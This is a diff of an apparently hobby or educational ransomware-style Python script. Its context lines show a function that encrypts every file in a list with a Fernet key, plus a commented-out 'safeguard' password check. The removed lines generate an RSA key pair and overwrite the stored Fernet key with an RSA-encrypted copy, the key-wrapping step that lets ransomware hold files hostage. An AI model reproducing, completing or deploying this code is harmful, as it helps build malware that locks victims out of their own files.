@@ -1,7 +1,5 @@
 import os
 from cryptography.fernet import Fernet
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
 
 # safeguard = input("Please enter the safeguard password:")
 # if safeguard != 'start':
@@ -32,17 +30,6 @@ def read_key():
 
     fernet = Fernet(key)
     return fernet
-
-def generate_rsa_keys():
-    key = RSA.generate(2048)
-
-    private_key = key.export_key()
-    with open('private.pem', 'wb') as f:
-        f.write(private_key)
-
-    public_key = key.publickey().export_key()
-    with open('public.pem', 'wb') as f:
-        f.write(public_key)
 
 #uses fernet key to encrypt all files in file_paths list
 def encrypt_files(file_paths, fernet):
@@ -89,17 +76,4 @@ def main():
 if __name__ == "__main__":
     main()
 
-
-def encrypt_fernet_key(self):
-    with open('fernet_key.txt', 'rb') as fk:
-        fernet_key = fk.read()
-    with open('fernet_key.txt', 'wb') as f:
-        # Public RSA key
-        public_key = RSA.import_key(open('public.pem').read())
-        # Public encrypter object
-        public_crypter =  PKCS1_OAEP.new(public_key)
-        # Encrypted fernet key
-        enc_fernent_key = public_crypter.encrypt(fernet_key)
-        # Write encrypted fernet key to file
-        f.write(enc_fernent_key)
 
